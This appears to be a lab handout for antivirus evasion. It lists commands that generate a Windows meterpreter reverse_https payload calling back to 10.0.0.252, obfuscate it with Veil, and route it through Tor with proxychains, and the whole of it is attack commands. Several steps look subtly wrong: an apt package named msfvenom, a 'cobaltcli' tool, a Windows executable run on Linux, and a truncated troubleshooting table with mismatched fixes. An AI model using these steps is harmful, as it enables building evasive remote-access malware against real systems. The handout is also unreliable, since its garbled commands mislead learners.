Lab 4 – Advanced Evasion Lab

Reference commands (full list) – see the block below.



1\. Environment‑Prep

sudo apt update

sudo apt install -y msfvenom veil python3-pip tor proxychains-ng

\# Check tor is running

systemctl start tor

2\. Generate the Obfuscated Payload

\# Create a raw meterpreter reverse\_https payload

msfvenom -p windows/meterpreter/reverse\_https LHOST=10.0.0.252 LPORT=443 -f raw > /tmp/meter.raw



\# Obfuscate it

veil-evasion -t windows/meterpreter -f exe -C %x86/obfuscate -i /tmp/meter.raw \\

&nbsp; -o /tmp/meter\_obf.exe



\# Verify hash

sha256sum /tmp/meter\_obf.exe

3\. Proxychains: Run through TOR

\# Proxychains config:

\#   /etc/proxychains.conf

\#       socks5 127.0.0.1 9050

proxychains -q /tmp/meter\_obf.exe

4\. Verify Connection

\# In Cobalt GRC or Metasploit

cobaltcli sessions list | grep '10.0.0.50'

5\. Troubleshooting

Step	Problem	Fix

Proxychains	No outgoing channel	Confirm `netstat -an

msfvenom	File length mismatch	Re‑run with -f exe

Tor	Digital signature errors	Use tor service systemctl start tor

6\. Full Commands

\# 1. Install prerequisites

sudo apt update \&\& sudo apt install -y msfvenom veil python3-pip tor proxychains-ng



\# 2. Start Tor

sudo systemctl enable tor

sudo systemctl start tor



\# 3. Generate base Map payload

msfvenom -p windows/meterpreter/reverse\_https \\

&nbsp; LHOST=10.0.0.252 LPORT=443 -f raw > /tmp/meter.raw



\# 4. Obfuscate with Veil

veil-evasion -t windows/meterpreter -f exe \\

&nbsp; -C %x86/obfuscate -i /tmp/meter.raw \\

&nbsp; -o /tmp/meter\_obf.exe



\# 5. Verify hash

sha256sum /tmp/meter\_obf.exe



\# 6. Run through TOR via Proxychains

proxychains -q /tmp/meter\_obf.exe

